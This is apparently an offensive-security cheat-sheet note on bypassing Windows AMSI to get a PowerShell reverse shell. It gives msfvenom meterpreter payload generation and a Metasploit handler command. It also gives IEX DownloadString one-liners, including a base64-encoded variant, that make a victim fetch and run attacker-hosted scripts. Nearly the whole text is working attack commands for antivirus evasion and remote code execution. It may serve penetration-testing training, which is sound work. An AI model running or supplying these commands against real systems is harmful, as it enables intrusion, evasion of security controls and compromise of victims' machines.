# AMSI Bypass

<details>

<summary>Powershell Rev shell from CMD.exe</summary>

* Download all files from [https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI](https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI)

- Change Line 1 of `runall.ps1` to Kali's IP

* Host Python Webserver on Kali&#x20;
* Generate the following payload & put in line 44 of shellcoderunner.ps1

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell
```

* Start Msfconsole listener

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set ExitOnSession false; exploit -j"
```

* Run following in victim

```powershell
#In CMD.exe
powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')

#In Powershell.exe
IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')

#Base64 encoded powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1') save to to_encode.txt
python b64_encode.py to_encode.txt
powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA3AC8AcgB1AG4AYQBsAGwALgBwAHMAMQAnACkA
```

</details>



